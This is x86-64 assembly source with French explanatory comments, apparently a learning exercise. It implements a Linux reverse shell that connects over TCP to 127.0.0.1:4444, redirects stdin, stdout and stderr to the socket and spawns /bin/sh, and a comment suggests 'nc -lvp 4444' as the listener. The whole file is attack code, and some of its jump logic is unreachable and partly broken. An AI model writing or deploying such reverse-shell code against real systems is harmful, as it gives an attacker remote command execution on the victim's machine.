Bits 64

global _start

section .bss
	struc sockaddr
		sin_family resw 1 ;2 octets
		sin_port resw 1;2 octets
		sin_addr resd 1;4 octets
	endstruc

section .data
	sockaddr_struct_init:
		istruc sockaddr
			at sin_family,dw 0x2 ; dw pour define word donc 2 octets
			at sin_port,dw 0x5c11 ; PORT 4444 donc faire un nc -lvp 4444 (0x5c11 est la conversion du port en byte network utiliser un convertisseur )
			at sin_addr,dd 0x100007f ; dd pour define dword (0x100007f conversion de l'adresse 127.0.0.1 en byte network)
		iend
	binsh db "/bin/sh",0x0
	binsh_len equ $-binsh


section .text
	

_exit:
	mov rax,0x3c 
	mov rdi,0x1
	syscall
	

_init_socket:
	mov rax,41 ; socket
	mov rdi,0x2 ;(2) AF_INET
	mov rsi,0x1 ;(1) SOCK_STREAM
	mov rdx,0x6 ;(6) TCP
	syscall
	ret;

_connect_to_socket:
	mov rax,42 ; connect
	pop rdi; on recupere la valeur du fd qu'on a mis precedement dans la stack et on la met directement dans rdi qui en a besoin
	push rdi; on repush la valeur du fd pour pas la perdre 
	mov rsi, sockaddr_struct_init ; on lui donne l'adresse de notre struct'
	mov rdx,0x10; 0x10 = 16 octets la struct fait 8 MAIS l’appel système connect attend un struct sockaddr_in, qui en fait 16 octets car le kernel réserve 8 octets supplémentaires (padding / unused / alignement)
;Donc tu dois toujours envoyer 16, même si ta structure assembleur n’en occupe que 8 visuellement.
	syscall
	

_duplicate_fd_stdin:
	mov rax,33 ; dup2
	pop rdi ; old fd ( on le recupere de la stack ou on l'avait push)
	push rdi; on repush la valeur du fd pour pas la perdre 
	mov rsi,0 ; new fd = 0 (stdin)
	syscall
	jmp _duplicate_fd_stdout


_duplicate_fd_stdout:
	mov rax,33 ; dup2
	pop rdi ; old fd ( on le recupere de la stack ou on l'avait push)
	push rdi; on repush la valeur du fd pour pas la perdre 
	mov rsi,1 ; new fd = 1 (stdout)
	syscall
	jmp _duplicate_fd_stderr


_duplicate_fd_stderr:
	mov rax,33 ; dup2
	pop rdi ; old fd ( on le recupere de la stack ou on l'avait push)
	push rdi; on repush la valeur du fd pour pas la perdre 
	mov rsi,2 ; new fd = 2 (stderr)
	syscall
	

; _write_on_stdout:
; 	mov rax,0x1
; 	mov rdi,0x1
; 	mov rsi,binsh
; 	mov rdx,binsh_len
; 	syscall

_spawn_shell:
	mov rax,59 ; syscall excve
	mov rdi,binsh
	xor rsi,rsi ; on met a 0 
	xor rdx,rdx ; on met a 0 car xor est true seulement si un des bit est different mais comme on fait cette comparaison avc le meme registre forcement tout est pareil donc tout return false donc chaque bits a 0
	syscall


_start:
	call _init_socket
	push rax ; sauve la valeur du fd genere par init_socket dans rax dans la stack
	jmp _connect_to_socket
	jmp _duplicate_fd_stdin
	; jmp _write_on_stdout; on va ecrire dans le stdout
	jmp _spawn_shell;
	jmp _exit
